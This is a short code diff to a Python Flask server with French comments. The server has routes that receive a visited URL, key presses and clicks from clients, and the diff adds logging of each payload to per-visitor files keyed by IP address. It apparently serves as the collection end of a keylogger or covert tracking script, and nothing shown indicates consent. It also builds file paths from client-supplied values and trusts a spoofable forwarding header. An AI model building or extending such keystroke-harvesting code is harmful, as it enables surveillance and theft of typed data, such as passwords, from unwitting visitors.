@@ -1,6 +1,7 @@
 import requests
 from flask import Flask, request, jsonify
 import os
+import json
 
 app = Flask(__name__)
 port = 3000
@@ -28,8 +29,14 @@ def hello_world():
 # Route pour recevoir les données du client - key
 @app.route('/url', methods=['POST'])
 def receive_url():
+    if request.headers.get('X-Forwarded-For'):
+        visitor_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    else:
+        visitor_ip = request.remote_addr
+        
     received_data = request.json
     print('url :', received_data)
+    dossier(visitor_ip, received_data)
     return 'Données reçues'
 
 
@@ -42,6 +49,7 @@ def receive_key():
     
     received_data = request.json
     print(f'Données reçues touche {visitor_ip}: {received_data}')
+    dossier(visitor_ip, received_data)
     return 'Données reçues'
 
 # Route pour recevoir les données du client - click
@@ -96,6 +104,13 @@ def dossier(ip, data):
         print('dossier créé')
     else:
         print('dossier déjà existant')
+
+    data_log_dir = f"Data/{ip}/{url}/log.txt"
+
+    with open(data_log_dir, 'a', encoding="utf-8") as f:
+        json.dump(data, f, ensure_ascii=False, indent=4)    
+        f.write('\n')
+        print('Données écrites dans le fichier', data_log_dir)
     
     print('________________________________________________________')
 
